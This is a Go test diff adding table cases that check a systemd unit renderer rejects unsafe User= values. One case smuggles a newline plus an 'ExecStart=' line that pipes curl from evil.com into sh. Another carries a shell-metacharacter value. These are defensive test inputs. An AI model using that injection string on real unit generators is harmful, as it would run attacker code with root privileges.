@@ -178,6 +178,41 @@ func TestRender_ValidationRejectsRelativePaths(t *testing.T) {
 			HolosBinary: "/usr/bin/holos",
 			Scope:       ScopeUser,
 		},
+		// The next four cases cover User= injection. Each value
+		// would be accepted verbatim by the previous Render and
+		// written into a root-owned [Service] block; only the
+		// newline case actually lands a second directive, but
+		// spaces and shell metacharacters are rejected on the same
+		// principle (values that don't round-trip through systemd
+		// parsing are bugs waiting to happen).
+		"user newline injection": {
+			Project:     "demo",
+			ComposeFile: "/abs/holos.yaml",
+			HolosBinary: "/usr/bin/holos",
+			Scope:       ScopeSystem,
+			User:        "alice\nExecStart=/bin/curl evil.com/x|sh",
+		},
+		"user with shell metachar": {
+			Project:     "demo",
+			ComposeFile: "/abs/holos.yaml",
+			HolosBinary: "/usr/bin/holos",
+			Scope:       ScopeSystem,
+			User:        "alice;rm",
+		},
+		"user uppercase": {
+			Project:     "demo",
+			ComposeFile: "/abs/holos.yaml",
+			HolosBinary: "/usr/bin/holos",
+			Scope:       ScopeSystem,
+			User:        "Alice",
+		},
+		"user leading digit": {
+			Project:     "demo",
+			ComposeFile: "/abs/holos.yaml",
+			HolosBinary: "/usr/bin/holos",
+			Scope:       ScopeSystem,
+			User:        "1alice",
+		},
 	}
 	for name, spec := range cases {
 		t.Run(name, func(t *testing.T) {
